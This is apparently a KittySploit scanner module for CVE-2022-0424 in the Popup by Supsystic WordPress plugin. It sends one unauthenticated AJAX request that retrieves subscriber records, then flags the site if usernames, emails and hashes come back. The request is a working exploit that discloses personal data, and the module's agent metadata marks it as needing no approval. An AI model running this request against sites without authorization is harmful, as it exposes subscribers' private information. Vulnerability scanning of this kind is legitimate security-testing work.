#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Popup by Supsystic WordPress plugin before 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Popup by Supsystic < 1.10.9 - Subscriber Email Addresses Disclosure Detection',
        'description': 'The Popup by Supsystic WordPress plugin before 1.10.9 does not have any authentication and authorisation in an AJAX action, allowing unauthenticated attackers to call it and get the email addresses of subscribed users',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'wpscan', 'cve', 'cve2022', 'wp', 'wp-plugin', 'wordpress', 'disclosure', 'popup', 'supsystic', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/1e4593fd-51e5-43ca-a244-9aaef3804b9f/',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-0424',
        ],
        'cve': 'CVE-2022-0424',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}, data='page=subscribe&action=getListForTbl&reqType=ajax&search=@&_search=false&pl=pps&sidx=id&rows=10\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"id":"', 'username":"', 'email":', 'hash":"', '_wpnonce',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='Popup by Supsystic < 1.10.9 - Subscriber Email Addresses Disclosure detected', path=path)
            return True
        return False

